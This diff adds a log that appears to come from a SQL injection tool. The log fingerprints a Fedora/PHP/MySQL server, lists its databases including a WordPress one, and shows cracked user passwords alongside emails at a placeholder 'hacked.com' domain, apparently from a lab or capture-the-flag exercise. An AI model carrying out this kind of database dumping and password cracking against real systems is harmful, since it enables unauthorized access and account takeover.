@@ -1,0 +1,28 @@
+[20:04:01] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Fedora 13 (Goddard)
+web application technology: PHP 5.3.3, Apache 2.2.15
+back-end DBMS: MySQL >= 5.0
+[20:04:01] [INFO] fetching database names
+[20:04:02] [INFO] used SQL query returns 3 entries
+[20:04:02] [INFO] retrieved: 'information_schema'
+[20:04:02] [INFO] retrieved: 'mysql'
+[20:04:02] [INFO] retrieved: 'wordpress'
+available databases [3]:
+[*] information_schema
+[*] mysql
+[*] wordpress
+
+------------------------------------------------------------------------------------------------------------------------
+
+[20:12:49] [INFO] cracked password 'admin' for user 'NickJames' -> NickJames (nickjames) -> NickJames@hacked.com                                                                                                                                      
+[20:12:49] [INFO] cracked password 'maxwell' for user 'JasonKonnors' -> JasonKonnors (jasonkonnors) -> JasonKonnors@hacked.com                                                                                  
+[20:12:50] [INFO] cracked password 'napoleon' for user 'TonyBlack' -> TonyBlack (tonyblack) -> TonyBlack@hacked.com
+                                                                        
+[20:12:57] [INFO] cracked password 'kernel' for user 'MaxBucky' -> MaxBucky (maxbucky) -> MaxBucky@hacked.com                                                                                                                                       
+[20:13:00] [INFO] cracked password 'q1w2e3' for user 'GeorgeMiller' -> GeorgeMiller (georgemiller) -> GeorgeMiller@hacked.com
+
+'PUPPIES' -> JohnSmith (johnsmith) -> JohnSmith@hacked
+
+
+
+
